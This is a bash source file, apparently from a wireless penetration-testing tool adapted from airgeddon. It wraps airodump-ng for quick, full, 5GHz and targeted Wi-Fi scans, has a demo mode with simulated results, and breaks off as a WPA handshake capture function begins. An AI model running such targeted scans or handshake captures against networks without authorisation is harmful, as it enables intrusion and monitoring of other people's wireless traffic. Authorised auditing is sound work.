#!/usr/bin/env bash
# Core functionality adapted from airgeddon
# Implements key features of airgeddon in a more interactive way

# shellcheck disable=SC2154,SC2034

# Function to perform a quick scan (2.4GHz)
perform_quick_scan() {
    # Create a temporary file for the scan results
    local temp_file="${TEMP_DIR}/quick_scan.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "Quick Scan" --msgbox "This will perform a quick scan of 2.4GHz networks.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 10 60
    
    # Check if we're in demo mode
    if [[ $DEMO_MODE -eq 1 ]]; then
        # In demo mode, create a simulated scan output
        log_message "Starting simulated quick scan on 2.4GHz networks (Demo Mode)"
        
        # Show a simulated terminal with scan animation
        xterm -title "Quick Scan (2.4GHz) - DEMO MODE" -geometry 100x30 -e "echo 'Starting scan in demo mode...'; echo ''; echo 'CH  9 ][ Elapsed: 15 s ][ 2023-05-10 10:42 ][ Demo Mode - Simulated Networks'; echo ''; echo 'BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID'; echo ''; echo 'AA:BB:CC:DD:EE:FF  -56     235       31    0   6  130  WPA2 CCMP   PSK  HomeNetwork'; echo 'BB:CC:DD:EE:FF:00  -67     185        0    0   1  130  WPA  TKIP   PSK  GuestWifi'; echo 'CC:DD:EE:FF:00:11  -72     120        0    0  11   54  WEP  WEP         OpenWifi'; echo 'DD:EE:FF:00:11:22  -83      95       24    0   6  130  WPA2 CCMP   PSK  OfficeNetwork'; echo 'EE:FF:00:11:22:33  -59     210        8    0   1  130  OPN              FreeWifi'; echo ''; echo 'BSSID              STATION            PWR   Rate    Lost    Frames  Notes'; echo 'AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -55   54e-54e     0      421'; echo 'AA:BB:CC:DD:EE:FF  22:33:44:55:66:77  -60   54-54       0      125'; echo 'DD:EE:FF:00:11:22  33:44:55:66:77:88  -67   54-54       0       95'; echo ''; echo 'Scanning... (Press CTRL+C to stop)'; sleep 15; echo ''; echo 'Scan complete!'; echo ''; read -p 'Press Enter to continue...'" &
        
        # Get PID of xterm
        local xterm_pid=$!
        
        # Wait for xterm to finish
        wait $xterm_pid
        
        # Create a simulated CSV file
        mkdir -p "$(dirname "$temp_file")"
        {
            echo "BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key"
            echo "AA:BB:CC:DD:EE:FF, 2023-05-10 10:42:15, 2023-05-10 10:42:30,  6, 130, WPA2, CCMP, PSK, -56,  235,   31,   0.  0.  0.  0,  10, HomeNetwork, "
            echo "BB:CC:DD:EE:FF:00, 2023-05-10 10:42:16, 2023-05-10 10:42:30,  1, 130, WPA, TKIP, PSK, -67,  185,    0,   0.  0.  0.  0,   9, GuestWifi, "
            echo "CC:DD:EE:FF:00:11, 2023-05-10 10:42:18, 2023-05-10 10:42:30, 11,  54, WEP, WEP, , -72,  120,    0,   0.  0.  0.  0,   8, OpenWifi, "
            echo "DD:EE:FF:00:11:22, 2023-05-10 10:42:20, 2023-05-10 10:42:30,  6, 130, WPA2, CCMP, PSK, -83,   95,   24,   0.  0.  0.  0,  13, OfficeNetwork, "
            echo "EE:FF:00:11:22:33, 2023-05-10 10:42:22, 2023-05-10 10:42:30,  1, 130, OPN, , , -59,  210,    8,   0.  0.  0.  0,   8, FreeWifi, "
            echo ""
            echo "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
            echo "11:22:33:44:55:66, 2023-05-10 10:42:19, 2023-05-10 10:42:30, -55,      421, AA:BB:CC:DD:EE:FF, "
            echo "22:33:44:55:66:77, 2023-05-10 10:42:23, 2023-05-10 10:42:30, -60,      125, AA:BB:CC:DD:EE:FF, "
            echo "33:44:55:66:77:88, 2023-05-10 10:42:25, 2023-05-10 10:42:30, -67,       95, DD:EE:FF:00:11:22, "
        } > "${temp_file}-01.csv"
        
        # Save scan results
        save_scan_results "${temp_file}-01.csv" "quick"
        
        # Display scan results
        display_scan_results "${temp_file}-01.csv" "Quick Scan Results (Demo Mode)"
        
        return 0
    fi
    
    # Real mode implementation
    # Start airodump-ng in a new terminal window
    log_message "Starting quick scan on 2.4GHz networks"
    xterm -title "Quick Scan (2.4GHz)" -geometry 100x30 -e "airodump-ng -w \"${temp_file}\" --output-format csv --band bg \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ -f "${temp_file}-01.csv" ]]; then
        # Save scan results
        save_scan_results "${temp_file}-01.csv" "quick"
        
        # Display scan results
        display_scan_results "${temp_file}-01.csv" "Quick Scan Results"
    else
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No results were saved." 6 60
    fi
}

# Function to perform a full scan (2.4GHz)
perform_full_scan() {
    # Create a temporary file for the scan results
    local temp_file="${TEMP_DIR}/full_scan.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "Full Scan" --msgbox "This will perform a full scan of 2.4GHz networks.\n\nThe scan will cycle through all channels to ensure maximum coverage.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 12 60
    
    # Check if we're in demo mode
    if [[ $DEMO_MODE -eq 1 ]]; then
        # In demo mode, create a simulated scan output with more networks
        log_message "Starting simulated full scan on 2.4GHz networks (Demo Mode)"
        
        # Show a simulated terminal with scan animation - longer scan with channel hopping
        xterm -title "Full Scan (2.4GHz) - DEMO MODE" -geometry 100x30 -e "echo 'Starting full scan in demo mode...'
echo ''
echo 'Cycling through all channels in the 2.4GHz band...'
sleep 1
for ch in {1..11}; do
    echo ''
    echo \"CH \$ch ][ Elapsed: \$((\$ch * 5)) s ][ $(date '+%Y-%m-%d %H:%M') ][ Demo Mode - Simulated Networks (Channel \$ch)\"
    echo ''
    echo 'BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID'
    echo ''
    case \$ch in
        1)
            echo 'BB:CC:DD:EE:FF:00  -67     185        0    0   1  130  WPA  TKIP   PSK  GuestWifi'
            echo 'EE:FF:00:11:22:33  -59     210        8    0   1  130  OPN              FreeWifi'
            echo '11:22:33:44:55:66  -73     142        0    0   1   54  WPA2 CCMP   PSK  NeighborNet1'
            ;;
        2)
            echo '22:33:44:55:66:77  -68     176        2    0   2  130  WPA2 CCMP   PSK  NeighborNet2'
            ;;
        3)
            echo '33:44:55:66:77:88  -70     198        0    0   3  130  WPA2 CCMP   PSK  WorkNetwork'
            ;;
        4)
            echo '44:55:66:77:88:99  -77     132        0    0   4   54  WEP  WEP         OldRouter'
            ;;
        5)
            echo '55:66:77:88:99:AA  -65     204       12    0   5  130  WPA2 CCMP   PSK  CoffeeShop'
            ;;
        6)
            echo 'AA:BB:CC:DD:EE:FF  -56     235       31    0   6  130  WPA2 CCMP   PSK  HomeNetwork'
            echo 'DD:EE:FF:00:11:22  -83      95       24    0   6  130  WPA2 CCMP   PSK  OfficeNetwork'
            echo '66:77:88:99:AA:BB  -74     146        9    0   6  130  WPA2 CCMP   PSK  Library'
            ;;
        7)
            echo '77:88:99:AA:BB:CC  -64     215        0    0   7  130  WPA2 CCMP   PSK  PublicWifi'
            ;;
        8)
            echo '88:99:AA:BB:CC:DD  -72     182        0    0   8  130  WPA2 CCMP   PSK  HotelGuest'
            ;;
        9)
            echo '99:AA:BB:CC:DD:EE  -77     143        4    0   9   54  WPA  TKIP   PSK  Restaurant'
            ;;
        10)
            echo 'AA:BB:CC:DD:EE:FF  -71     189        0    0  10  130  WPA2 CCMP   PSK  AirportWifi'
            ;;
        11)
            echo 'CC:DD:EE:FF:00:11  -72     120        0    0  11   54  WEP  WEP         OpenWifi'
            echo 'BB:CC:DD:EE:FF:00  -76     155        3    0  11  130  WPA2 CCMP   PSK  SchoolWifi'
            ;;
    esac
    sleep 2
done

echo ''
echo 'BSSID              STATION            PWR   Rate    Lost    Frames  Notes'
echo 'AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -55   54e-54e     0      421'
echo 'AA:BB:CC:DD:EE:FF  22:33:44:55:66:77  -60   54-54       0      125'
echo 'DD:EE:FF:00:11:22  33:44:55:66:77:88  -67   54-54       0       95'
echo '55:66:77:88:99:AA  44:55:66:77:88:99  -62   54-54       0      217'
echo '66:77:88:99:AA:BB  55:66:77:88:99:AA  -73   54-54       0       83'
echo ''
echo 'Scan complete!'
echo ''
read -p 'Press Enter to continue...'" &
        
        # Get PID of xterm
        local xterm_pid=$!
        
        # Wait for xterm to finish
        wait $xterm_pid
        
        # Create a simulated CSV file with more networks
        mkdir -p "$(dirname "$temp_file")"
        {
            echo "BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key"
            echo "AA:BB:CC:DD:EE:FF, 2023-05-10 10:42:15, 2023-05-10 10:42:30,  6, 130, WPA2, CCMP, PSK, -56,  235,   31,   0.  0.  0.  0,  10, HomeNetwork, "
            echo "BB:CC:DD:EE:FF:00, 2023-05-10 10:42:16, 2023-05-10 10:42:30,  1, 130, WPA, TKIP, PSK, -67,  185,    0,   0.  0.  0.  0,   9, GuestWifi, "
            echo "CC:DD:EE:FF:00:11, 2023-05-10 10:42:18, 2023-05-10 10:42:30, 11,  54, WEP, WEP, , -72,  120,    0,   0.  0.  0.  0,   8, OpenWifi, "
            echo "DD:EE:FF:00:11:22, 2023-05-10 10:42:20, 2023-05-10 10:42:30,  6, 130, WPA2, CCMP, PSK, -83,   95,   24,   0.  0.  0.  0,  13, OfficeNetwork, "
            echo "EE:FF:00:11:22:33, 2023-05-10 10:42:22, 2023-05-10 10:42:30,  1, 130, OPN, , , -59,  210,    8,   0.  0.  0.  0,   8, FreeWifi, "
            echo "11:22:33:44:55:66, 2023-05-10 10:42:23, 2023-05-10 10:42:30,  1,  54, WPA2, CCMP, PSK, -73,  142,    0,   0.  0.  0.  0,  12, NeighborNet1, "
            echo "22:33:44:55:66:77, 2023-05-10 10:42:24, 2023-05-10 10:42:30,  2, 130, WPA2, CCMP, PSK, -68,  176,    2,   0.  0.  0.  0,  12, NeighborNet2, "
            echo "33:44:55:66:77:88, 2023-05-10 10:42:25, 2023-05-10 10:42:30,  3, 130, WPA2, CCMP, PSK, -70,  198,    0,   0.  0.  0.  0,  12, WorkNetwork, "
            echo "44:55:66:77:88:99, 2023-05-10 10:42:26, 2023-05-10 10:42:30,  4,  54, WEP, WEP, , -77,  132,    0,   0.  0.  0.  0,   9, OldRouter, "
            echo "55:66:77:88:99:AA, 2023-05-10 10:42:27, 2023-05-10 10:42:30,  5, 130, WPA2, CCMP, PSK, -65,  204,   12,   0.  0.  0.  0,  10, CoffeeShop, "
            echo "66:77:88:99:AA:BB, 2023-05-10 10:42:28, 2023-05-10 10:42:30,  6, 130, WPA2, CCMP, PSK, -74,  146,    9,   0.  0.  0.  0,   7, Library, "
            echo "77:88:99:AA:BB:CC, 2023-05-10 10:42:29, 2023-05-10 10:42:30,  7, 130, WPA2, CCMP, PSK, -64,  215,    0,   0.  0.  0.  0,   9, PublicWifi, "
            echo "88:99:AA:BB:CC:DD, 2023-05-10 10:42:30, 2023-05-10 10:42:30,  8, 130, WPA2, CCMP, PSK, -72,  182,    0,   0.  0.  0.  0,   9, HotelGuest, "
            echo "99:AA:BB:CC:DD:EE, 2023-05-10 10:42:31, 2023-05-10 10:42:30,  9,  54, WPA, TKIP, PSK, -77,  143,    4,   0.  0.  0.  0,  10, Restaurant, "
            echo "AA:BB:CC:DD:EE:00, 2023-05-10 10:42:32, 2023-05-10 10:42:30, 10, 130, WPA2, CCMP, PSK, -71,  189,    0,   0.  0.  0.  0,  10, AirportWifi, "
            echo "BB:CC:DD:EE:FF:11, 2023-05-10 10:42:33, 2023-05-10 10:42:30, 11, 130, WPA2, CCMP, PSK, -76,  155,    3,   0.  0.  0.  0,  10, SchoolWifi, "
            echo ""
            echo "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
            echo "11:22:33:44:55:66, 2023-05-10 10:42:19, 2023-05-10 10:42:30, -55,      421, AA:BB:CC:DD:EE:FF, "
            echo "22:33:44:55:66:77, 2023-05-10 10:42:23, 2023-05-10 10:42:30, -60,      125, AA:BB:CC:DD:EE:FF, "
            echo "33:44:55:66:77:88, 2023-05-10 10:42:25, 2023-05-10 10:42:30, -67,       95, DD:EE:FF:00:11:22, "
            echo "44:55:66:77:88:99, 2023-05-10 10:42:27, 2023-05-10 10:42:30, -62,      217, 55:66:77:88:99:AA, "
            echo "55:66:77:88:99:AA, 2023-05-10 10:42:28, 2023-05-10 10:42:30, -73,       83, 66:77:88:99:AA:BB, "
        } > "${temp_file}-01.csv"
        
        # Save scan results
        save_scan_results "${temp_file}-01.csv" "full"
        
        # Display scan results
        display_scan_results "${temp_file}-01.csv" "Full Scan Results (Demo Mode)"
        
        return 0
    fi
    
    # Real mode implementation
    # Start airodump-ng in a new terminal window with channel hopping
    log_message "Starting full scan on 2.4GHz networks"
    xterm -title "Full Scan (2.4GHz)" -geometry 100x30 -e "airodump-ng -w \"${temp_file}\" --output-format csv --band bg \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ -f "${temp_file}-01.csv" ]]; then
        # Save scan results
        save_scan_results "${temp_file}-01.csv" "full"
        
        # Display scan results
        display_scan_results "${temp_file}-01.csv" "Full Scan Results"
    else
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No results were saved." 6 60
    fi
}

# Function to perform a 5GHz scan
perform_5ghz_scan() {
    # Create a temporary file for the scan results
    local temp_file="${TEMP_DIR}/5ghz_scan.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Check if the interface supports 5GHz
    if [[ $(supports_5ghz "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "The selected interface does not support 5GHz networks." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "5GHz Scan" --msgbox "This will perform a scan of 5GHz networks.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 10 60
    
    # Check if we're in demo mode
    if [[ $DEMO_MODE -eq 1 ]]; then
        # In demo mode, create a simulated 5GHz scan output
        log_message "Starting simulated 5GHz scan (Demo Mode)"
        
        # Show a simulated terminal with scan animation for 5GHz
        xterm -title "5GHz Scan - DEMO MODE" -geometry 100x30 -e "echo 'Starting 5GHz scan in demo mode...'
echo ''
echo 'Cycling through 5GHz channels...'
sleep 1
for ch in 36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 149 153 157 161 165; do
    echo ''
    echo \"CH \$ch ][ Elapsed: \$((\$ch / 4)) s ][ $(date '+%Y-%m-%d %H:%M') ][ Demo Mode - Simulated 5GHz Networks (Channel \$ch)\"
    echo ''
    echo 'BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID'
    echo ''
    case \$ch in
        36)
            echo 'CC:11:22:33:44:55  -63     210        5    0  36  867  WPA2 CCMP   PSK  FastRouter5G'
            echo 'DD:22:33:44:55:66  -71     178        0    0  36  867  WPA2 CCMP   PSK  HomeNetwork5G'
            ;;
        40)
            echo 'EE:33:44:55:66:77  -68     192        3    0  40  867  WPA2 CCMP   PSK  OfficeWifi5G'
            ;;
        44)
            echo 'FF:44:55:66:77:88  -69     202        0    0  44  867  WPA2 CCMP   PSK  WorkNetwork5G'
            ;;
        48)
            echo '00:55:66:77:88:99  -65     215        8    0  48  867  WPA2 CCMP   PSK  CoffeeShop5G'
            ;;
        52)
            echo '11:66:77:88:99:AA  -76     164        2    0  52  867  WPA2 CCMP   PSK  Library5G'
            ;;
        56)
            echo '22:77:88:99:AA:BB  -79     148        0    0  56  867  WPA2 CCMP   PSK  RestaurantWifi5'
            ;;
        60)
            echo '33:88:99:AA:BB:CC  -72     183        0    0  60  867  WPA2 CCMP   PSK  HotelGuest5G'
            ;;
        149)
            echo '44:99:AA:BB:CC:DD  -67     197        6    0 149  867  WPA2 CCMP   PSK  AirportLounge5G'
            ;;
        153)
            echo '55:AA:BB:CC:DD:EE  -74     175        0    0 153  867  WPA2 CCMP   PSK  ConferenceWifi5G'
            ;;
        157)
            echo '66:BB:CC:DD:EE:FF  -77     158        0    0 157  867  WPA2 CCMP   PSK  GamingNetwork5G'
            ;;
        161)
            echo '77:CC:DD:EE:FF:00  -70     188        4    0 161  867  WPA2 CCMP   PSK  StreamingWifi5G'
            ;;
    esac
    sleep 1
done

echo ''
echo 'BSSID              STATION            PWR   Rate    Lost    Frames  Notes'
echo 'CC:11:22:33:44:55  AB:CD:EF:12:34:56  -58   54e-867e    0      352'
echo 'DD:22:33:44:55:66  BC:DE:F0:12:34:56  -65   54-867      0      203'
echo '00:55:66:77:88:99  CD:EF:01:23:45:67  -61   54-867      0      157'
echo '44:99:AA:BB:CC:DD  DE:F0:12:34:56:78  -64   54-867      0      229'
echo ''
echo 'Scan complete!'
echo ''
read -p 'Press Enter to continue...'" &
        
        # Get PID of xterm
        local xterm_pid=$!
        
        # Wait for xterm to finish
        wait $xterm_pid
        
        # Create a simulated CSV file for 5GHz networks
        mkdir -p "$(dirname "$temp_file")"
        {
            echo "BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key"
            echo "CC:11:22:33:44:55, 2023-05-10 10:48:15, 2023-05-10 10:49:30, 36, 867, WPA2, CCMP, PSK, -63,  210,    5,   0.  0.  0.  0,  12, FastRouter5G, "
            echo "DD:22:33:44:55:66, 2023-05-10 10:48:16, 2023-05-10 10:49:30, 36, 867, WPA2, CCMP, PSK, -71,  178,    0,   0.  0.  0.  0,  12, HomeNetwork5G, "
            echo "EE:33:44:55:66:77, 2023-05-10 10:48:18, 2023-05-10 10:49:30, 40, 867, WPA2, CCMP, PSK, -68,  192,    3,   0.  0.  0.  0,  12, OfficeWifi5G, "
            echo "FF:44:55:66:77:88, 2023-05-10 10:48:20, 2023-05-10 10:49:30, 44, 867, WPA2, CCMP, PSK, -69,  202,    0,   0.  0.  0.  0,  13, WorkNetwork5G, "
            echo "00:55:66:77:88:99, 2023-05-10 10:48:22, 2023-05-10 10:49:30, 48, 867, WPA2, CCMP, PSK, -65,  215,    8,   0.  0.  0.  0,  12, CoffeeShop5G, "
            echo "11:66:77:88:99:AA, 2023-05-10 10:48:24, 2023-05-10 10:49:30, 52, 867, WPA2, CCMP, PSK, -76,  164,    2,   0.  0.  0.  0,   9, Library5G, "
            echo "22:77:88:99:AA:BB, 2023-05-10 10:48:26, 2023-05-10 10:49:30, 56, 867, WPA2, CCMP, PSK, -79,  148,    0,   0.  0.  0.  0,  14, RestaurantWifi5, "
            echo "33:88:99:AA:BB:CC, 2023-05-10 10:48:28, 2023-05-10 10:49:30, 60, 867, WPA2, CCMP, PSK, -72,  183,    0,   0.  0.  0.  0,  12, HotelGuest5G, "
            echo "44:99:AA:BB:CC:DD, 2023-05-10 10:48:30, 2023-05-10 10:49:30, 149, 867, WPA2, CCMP, PSK, -67,  197,    6,   0.  0.  0.  0,  14, AirportLounge5G, "
            echo "55:AA:BB:CC:DD:EE, 2023-05-10 10:48:32, 2023-05-10 10:49:30, 153, 867, WPA2, CCMP, PSK, -74,  175,    0,   0.  0.  0.  0,  16, ConferenceWifi5G, "
            echo "66:BB:CC:DD:EE:FF, 2023-05-10 10:48:34, 2023-05-10 10:49:30, 157, 867, WPA2, CCMP, PSK, -77,  158,    0,   0.  0.  0.  0,  15, GamingNetwork5G, "
            echo "77:CC:DD:EE:FF:00, 2023-05-10 10:48:36, 2023-05-10 10:49:30, 161, 867, WPA2, CCMP, PSK, -70,  188,    4,   0.  0.  0.  0,  16, StreamingWifi5G, "
            echo ""
            echo "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
            echo "AB:CD:EF:12:34:56, 2023-05-10 10:48:19, 2023-05-10 10:49:30, -58,      352, CC:11:22:33:44:55, "
            echo "BC:DE:F0:12:34:56, 2023-05-10 10:48:23, 2023-05-10 10:49:30, -65,      203, DD:22:33:44:55:66, "
            echo "CD:EF:01:23:45:67, 2023-05-10 10:48:27, 2023-05-10 10:49:30, -61,      157, 00:55:66:77:88:99, "
            echo "DE:F0:12:34:56:78, 2023-05-10 10:48:31, 2023-05-10 10:49:30, -64,      229, 44:99:AA:BB:CC:DD, "
        } > "${temp_file}-01.csv"
        
        # Save scan results
        save_scan_results "${temp_file}-01.csv" "5ghz"
        
        # Display scan results
        display_scan_results "${temp_file}-01.csv" "5GHz Scan Results (Demo Mode)"
        
        return 0
    fi
    
    # Real mode implementation
    # Start airodump-ng in a new terminal window with 5GHz band
    log_message "Starting scan on 5GHz networks"
    xterm -title "5GHz Scan" -geometry 100x30 -e "airodump-ng -w \"${temp_file}\" --output-format csv --band a \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ -f "${temp_file}-01.csv" ]]; then
        # Save scan results
        save_scan_results "${temp_file}-01.csv" "5ghz"
        
        # Display scan results
        display_scan_results "${temp_file}-01.csv" "5GHz Scan Results"
    else
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No results were saved." 6 60
    fi
}

# Function to perform a targeted scan
perform_targeted_scan() {
    # First, perform a quick scan to get a list of available networks
    local quick_scan_file="${TEMP_DIR}/quick_scan_for_target.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "Scanning for Networks" --msgbox "Performing a quick scan to find available networks.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 10 60
    
    # Start airodump-ng for a quick scan
    log_message "Starting quick scan to find networks for targeted scan"
    xterm -title "Finding Networks" -geometry 100x30 -e "airodump-ng -w \"${quick_scan_file}\" --output-format csv \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ ! -f "${quick_scan_file}-01.csv" ]]; then
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No networks were found." 6 60
        return 1
    fi
    
    # Parse the CSV to get a list of networks
    local networks=()
    local bssids=()
    local channels=()
    
    # Skip the first line (header)
    local skip_first=1
    local in_clients_section=0
    
    while IFS=, read -r line; do
        # Skip the first line (header)
        if [[ $skip_first -eq 1 ]]; then
            skip_first=0
            continue
        fi
        
        # Check if we've reached the "Station MAC" line which indicates the start of client section
        if [[ "$line" == *"Station MAC"* ]]; then
            in_clients_section=1
            continue
        fi
        
        # Skip client section
        if [[ $in_clients_section -eq 1 ]]; then
            continue
        fi
        
        # Extract data from the CSV
        local bssid
        local essid
        local channel
        
        # Parse the line to extract BSSID, ESSID, and channel
        bssid=$(echo "$line" | awk -F, '{print $1}' | tr -d ' ')
        essid=$(echo "$line" | awk -F, '{print $14}' | tr -d ' ')
        channel=$(echo "$line" | awk -F, '{print $4}' | tr -d ' ')
        
        # Skip empty lines or lines with no BSSID
        if [[ -z "$bssid" || "$bssid" == " " ]]; then
            continue
        fi
        
        # If ESSID is empty, use "Hidden Network"
        if [[ -z "$essid" || "$essid" == " " ]]; then
            essid="Hidden Network"
        fi
        
        # Add to arrays
        networks+=("$bssid" "$essid ($channel)")
        bssids+=("$bssid")
        channels+=("$channel")
    done < "${quick_scan_file}-01.csv"
    
    # If no networks found
    if [[ ${#networks[@]} -eq 0 ]]; then
        dialog --title "Error" --msgbox "No networks were found in the scan." 6 40
        return 1
    fi
    
    # Show menu to select a network
    local selected_network
    selected_network=$(dialog --title "Select Network" --menu "Select a network to target:" 20 76 10 "${networks[@]}" 3>&1 1>&2 2>&3)
    
    # If user cancelled
    if [[ -z "$selected_network" ]]; then
        return 0
    fi
    
    # Find the index of the selected network
    local index=0
    for ((i=0; i<${#bssids[@]}; i++)); do
        if [[ "${bssids[$i]}" == "$selected_network" ]]; then
            index=$i
            break
        fi
    done
    
    # Get the channel of the selected network
    local target_channel="${channels[$index]}"
    
    # Create a temporary file for the targeted scan
    local target_scan_file="${TEMP_DIR}/targeted_scan"
    
    # Show information dialog
    dialog --title "Targeted Scan" --msgbox "Starting targeted scan on network:\nBSSID: $selected_network\nChannel: $target_channel\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 12 60
    
    # Start airodump-ng for the targeted scan
    log_message "Starting targeted scan on BSSID: $selected_network (Channel: $target_channel)"
    xterm -title "Targeted Scan" -geometry 100x30 -e "airodump-ng -w \"${target_scan_file}\" --output-format csv --bssid \"$selected_network\" -c \"$target_channel\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ -f "${target_scan_file}-01.csv" ]]; then
        # Save scan results
        save_scan_results "${target_scan_file}-01.csv" "targeted"
        
        # Display scan results
        display_scan_results "${target_scan_file}-01.csv" "Targeted Scan Results"
    else
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No results were saved." 6 60
    fi
}

# Function to display scan results
display_scan_results() {
    local csv_file="$1"
    local title="$2"
    
    # Parse the CSV to create a formatted output
    local output=""
    local skip_first=1
    local in_clients_section=0
    
    output+="BSSID               CH  SIGNAL  SECURITY   ESSID\n"
    output+="----------------------------------------------------------------\n"
    
    while IFS=, read -r line; do
        # Skip the first line (header)
        if [[ $skip_first -eq 1 ]]; then
            skip_first=0
            continue
        fi
        
        # Check if we've reached the "Station MAC" line which indicates the start of client section
        if [[ "$line" == *"Station MAC"* ]]; then
            in_clients_section=1
            output+="\nConnected Clients:\n"
            output+="----------------------------------------------------------------\n"
            output+="CLIENT MAC          BSSID               SIGNAL  PACKETS\n"
            output+="----------------------------------------------------------------\n"
            continue
        fi
        
        if [[ $in_clients_section -eq 0 ]]; then
            # Parse AP section
            local bssid
            local essid
            local channel
            local power
            local security
            
            bssid=$(echo "$line" | awk -F, '{print $1}' | tr -d ' ')
            channel=$(echo "$line" | awk -F, '{print $4}' | tr -d ' ')
            power=$(echo "$line" | awk -F, '{print $3}' | tr -d ' ')
            security=$(echo "$line" | awk -F, '{print $6 $7 $8}' | tr -d ' ')
            essid=$(echo "$line" | awk -F, '{print $14}' | tr -d ' ')
            
            # Skip empty lines or lines with no BSSID
            if [[ -z "$bssid" || "$bssid" == " " ]]; then
                continue
            fi
            
            # If ESSID is empty, use "Hidden Network"
            if [[ -z "$essid" || "$essid" == " " ]]; then
                essid="<Hidden Network>"
            fi
            
            # Format security info
            if [[ "$security" == *"WPA"* ]]; then
                if [[ "$security" == *"WPA2"* ]]; then
                    security="WPA/WPA2"
                else
                    security="WPA"
                fi
            elif [[ "$security" == *"WEP"* ]]; then
                security="WEP"
            else
                security="Open"
            fi
            
            # Format signal strength
            power=$(( power * -1 ))
            
            # Add to output
            output+=$(printf "%-20s %-3s %-7s %-10s %s\n" "$bssid" "$channel" "$power dBm" "$security" "$essid")
        else
            # Parse client section
            local client_mac
            local client_bssid
            local client_power
            local client_packets
            
            client_mac=$(echo "$line" | awk -F, '{print $1}' | tr -d ' ')
            client_bssid=$(echo "$line" | awk -F, '{print $6}' | tr -d ' ')
            client_power=$(echo "$line" | awk -F, '{print $3}' | tr -d ' ')
            client_packets=$(echo "$line" | awk -F, '{print $5}' | tr -d ' ')
            
            # Skip empty lines or lines with no client MAC
            if [[ -z "$client_mac" || "$client_mac" == " " ]]; then
                continue
            fi
            
            # Format signal strength
            client_power=$(( client_power * -1 ))
            
            # Add to output
            output+=$(printf "%-20s %-20s %-7s %s\n" "$client_mac" "$client_bssid" "$client_power dBm" "$client_packets")
        fi
    done < "$csv_file"
    
    # Display results in a scrollable window
    dialog --title "$title" --backtitle "Wireless Warlord" --cr-wrap --scrollbar --msgbox "$output" 24 76
}

# Function to capture WPA handshake
capture_wpa_handshake() {
    # First, perform a quick scan to get a list of available networks
    local quick_scan_file="${TEMP_DIR}/quick_scan_for_handshake.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "Scanning for Networks" --msgbox "Performing a quick scan to find available networks.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 10 60
    
    # Start airodump-ng for a quick scan
    log_message "Starting quick scan to find networks for handshake capture"
    xterm -title "Finding Networks" -geometry 100x30 -e "airodump-ng -w \"${quick_scan_file}\" --output-format csv \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
